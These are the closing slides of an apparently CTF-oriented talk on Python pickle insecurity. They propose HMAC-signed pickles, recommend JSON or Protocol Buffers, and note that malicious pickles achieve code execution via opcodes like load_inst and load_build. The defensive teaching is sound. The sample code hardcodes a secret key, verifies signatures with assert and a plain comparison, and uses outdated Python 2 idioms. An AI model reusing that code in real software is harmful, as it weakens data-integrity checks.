</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/8/3"><span class="slide-number-a">9</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">4</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 310px; width: 960px;" data-slide-number="&lt;a href=&quot;#/8/4&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;5&lt;/span&gt;&lt;/a&gt;"><div><ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Consider signing data with <strong data-position="NaN" data-size="0">hmac</strong> if you need to ensure that it has not been tampered with.</li>
</ul>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/8/4"><span class="slide-number-a">9</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">5</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 119px; width: 960px;" data-slide-number="&lt;a href=&quot;#/8/5&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;6&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Digital Signature</h4>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment"># encoding:utf-8</span>

<span class="hljs-keyword">import</span> hmac
<span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> base64

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, name, age</span>):</span>
        self.name = name
        self.age = age
    
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__str__</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"My name is %s, I am %d years old."</span> % (
            self.name, 
            self.age
        )

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HMAC_Pickler</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, secret_key, seperator=<span class="hljs-string">"|"</span></span>):</span>
        self.secret_key = secret_key
        self.seperator = seperator

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">digital_signature</span>(<span class="hljs-params">self, data</span>):</span>
        signer = hmac.new(self.secret_key)
        signer.update(data)
        <span class="hljs-keyword">return</span> signer.hexdigest()

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">loads</span>(<span class="hljs-params">self, data</span>):</span>
        sign = data[:<span class="hljs-number">32</span>]
        p = data[<span class="hljs-number">32</span>+<span class="hljs-built_in">len</span>(self.seperator):]
        <span class="hljs-keyword">assert</span> sign == self.digital_signature(p), (<span class="hljs-string">"Data is tampered by someone."</span>)
        <span class="hljs-keyword">return</span> pickle.loads(p)
        
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dumps</span>(<span class="hljs-params">self, obj</span>):</span>
        p = pickle.dumps(obj)
        sign = self.digital_signature(p)
        <span class="hljs-keyword">return</span> <span class="hljs-string">"%s%s%s"</span> % (sign, self.seperator, p)
        

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>
    SECRET_KEY = <span class="hljs-string">b'7f54a0ab-6443-457c-ba20-2510ebbfb28f'</span>
    pickler = HMAC_Pickler(SECRET_KEY)

    obj = Student(<span class="hljs-string">"Jack"</span>, <span class="hljs-number">19</span>)
    print(obj)

    p = pickler.dumps(obj)
    print(p)

    o = pickler.loads(p)
    print(o)

    p += <span class="hljs-string">"I am hacker, trying evil things"</span>

    x = pickler.loads(p)
    print(x)


    
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    main()
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/8/5"><span class="slide-number-a">9</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">6</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 275px; width: 960px;" data-slide-number="&lt;a href=&quot;#/8/6&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;7&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Avoid using pickle</h4>
<ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Json</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Google Protocol Buffers</li>
</ul>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/8/6"><span class="slide-number-a">9</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">7</span></a></div></div></section><section hidden="" aria-hidden="true" class="stack present" style="display: block;" data-slide-number="&lt;a href=&quot;#/9&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;10&lt;/span&gt;&lt;/a&gt;"><div class="pdf-page" style="height: 727px;"><div class="slide-background present" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" hidden="" aria-hidden="true" class="present" style="display: block; left: 19px; top: 321.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/9&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;1&lt;/span&gt;&lt;/a&gt;"><div><h3 class="raw part" data-startline="NaN" data-endline="NaN">Conclusion</h3>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/9"><span class="slide-number-a">10</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">1</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 121px; width: 960px;" data-slide-number="&lt;a href=&quot;#/9/1&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;2&lt;/span&gt;&lt;/a&gt;"><div><ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Give up pickle <strong data-position="NaN" data-size="0">RIGHT NOW</strong></li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">It is possible to construct malicious pickle data which will <strong data-position="NaN" data-size="0">execute arbitrary code</strong> during unpickling.</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">RCE is there with or without opcode ‘R’
<ul>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">load_inst</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">load_obj</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">load_build</li>
</ul>
</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Pickle handles the module import</li>
</ul>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/9/1"><span class="slide-number-a">10</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">2</span></a></div></div></section><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" hidden="" aria-hidden="true" class="present" style="display: block; left: 19px; top: 275px; width: 960px;" data-slide-number="&lt;a href=&quot;#/10&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;11&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">TODOs</h4>
<ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">PHP-Serializer</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Yaml</li>
</ul>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/10"><span class="slide-number-a">11</span></a></div></div><section hidden="" aria-hidden="true" class="stack present" style="display: block;" data-slide-number="&lt;a href=&quot;#/11&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;12&lt;/span&gt;&lt;/a&gt;"><div class="pdf-page" style="height: 727px;"><div class="slide-background present" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" hidden="" aria-hidden="true" class="present" style="display: block; left: 19px; top: 321.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/11&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;1&lt;/span&gt;&lt;/a&gt;"><div><h3 class="raw part" data-startline="NaN" data-endline="NaN">Thank you for listening</h3>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/11"><span class="slide-number-a">12</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">1</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 321.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/11/1&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;2&lt;/span&gt;&lt;/a&gt;"><div><h3 class="raw part" data-startline="NaN" data-endline="NaN">Q&amp;A</h3>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/11/1"><span class="slide-number-a">12</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">2</span></a></div></div></section></div>
            <div class="backgrounds"><div class="slide-background stack future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><div class="slide-background stack future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><div class="slide-background stack future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><div class="slide-background stack future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><div class="slide-background stack future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><div class="slide-background stack future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><div class="slide-background stack future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><div class="slide-background stack future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div></div><div class="progress" style="display: block;"><span style="width: 0px;"></span></div><aside class="controls" data-controls-layout="bottom-right" data-controls-back-arrows="faded" style="display: block;"><button class="navigate-left" aria-label="previous slide" disabled="disabled"><div class="controls-arrow"></div></button><button class="navigate-right enabled" aria-label="next slide"><div class="controls-arrow"></div></button><button class="navigate-up" aria-label="above slide" disabled="disabled"><div class="controls-arrow"></div></button><button class="navigate-down enabled highlight" aria-label="below slide"><div class="controls-arrow"></div></button></aside><div class="slide-number" style="display: none;"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/"><span class="slide-number-a">1</span></a></div><div class="speaker-notes" data-prevent-swipe="" tabindex="0"></div><div class="pause-overlay"><button class="resume-button">Resume presentation</button></div><div id="aria-status-div" aria-live="polite" aria-atomic="true" style="position: absolute; height: 1px; width: 1px; overflow: hidden; clip: rect(1px, 1px, 1px, 1px);"> Security Issues in Python Pickle
</div><div class="progress" style="display: block; position: fixed; bottom: 0px; width: 100%; height: 0px;"><div style="height: 100%; will-change: width; background-color: rgb(200, 0, 0); width: 100%;"></div></div></div>

            <div id="meta" style="display: none;">{"title":"Security Issues in Python Pickle","tags":"CTF, Pickle, Python, Serialize","description":"introduction of security issues in python serialization.","slideOptions":{"progress":true,"allottedMinutes":1,"transition":"slide","backgroundTransition":"fade","previewLinks":true,"slideNumber":true}}</div>

            <div class="footer">
                <div class="unselectable hidden-print" style="color: #777; line-height: 22px;">
                    <small>
                        <span>
                            
                                <span class="ui-lastchangeuser" data-profile="2KUYNtTcQ7WRyTsBT7oePg"> <a class="ui-user-icon small user-card-popover" style="background-image: url(https://avatars.githubusercontent.com/u/16917636?s=96);" target="_blank" href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg" data-toggle="popover" data-original-title="" title=""></a></span>
                            
                            &nbsp;<span class="text-uppercase ui-status-lastchange" title="Sat, Dec 7, 2019 1:36 PM">changed a year ago</span>
                            <span class="ui-lastchange text-uppercase" data-createtime="Sat Jul 28 2018 08:19:13 GMT+0000 (UTC)" data-updatetime="Sat Dec 07 2019 08:06:53 GMT+0000 (UTC)"></span>
                        </span>
                        <span class="pull-right">
                            2506 views
                            <a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX/edit?both" class="ui-edit" title="Edit this note">
                                <i class="fa fa-fw fa-pencil"></i>
                            </a>
                            <a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf" class="ui-print" title="Print slide">
                                <i class="fa fa-fw fa-print"></i>
                            </a>
                        </span>
                        <br>
                        
                        
                    </small>
                </div>
                
            </div>
        </div>

        
<script async="" src="./Security Issues in Python Pickle - HackMD_files/js"></script>
<script nonce="">
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    let userid = (document.cookie.match('(^|; )userid=([^;]*)')||0)[2];
    gtag('config', 'UA-60728495-1', {'user_id': userid});
</script>
<script src="./Security Issues in Python Pickle - HackMD_files/bundle.min.js" crossorigin="anonymous"></script>
<script nonce="">Sentry.init({ dsn: 'https://73410f1915d84abc8b2dd1f1aabd1c82@sentry.hackmd.dev/4', environment: 'production', integrations: function (intrus) { return intrus.filter(function (itr) { return itr.name !== 'TryCatch' }) } });</script>


        
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KLW9Z3"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->


        <script src="./Security Issues in Python Pickle - HackMD_files/i18n.js"></script>
        
         <script src="./Security Issues in Python Pickle - HackMD_files/font-vendor.3c28db3001b8bd6f1d3f.js" defer="defer"></script><script src="./Security Issues in Python Pickle - HackMD_files/common-vendor.d485f77e88ea7ed44236.js" defer="defer"></script><script src="./Security Issues in Python Pickle - HackMD_files/slide-vendor.b73dc8703442066e2cf3.js" defer="defer"></script><script src="./Security Issues in Python Pickle - HackMD_files/slide-common.77c3e21ff8d1555ba104.js" defer="defer"></script><script src="./Security Issues in Python Pickle - HackMD_files/slide.4382f2747f6869497fb6.js" defer="defer"></script>
        
    




</body></html>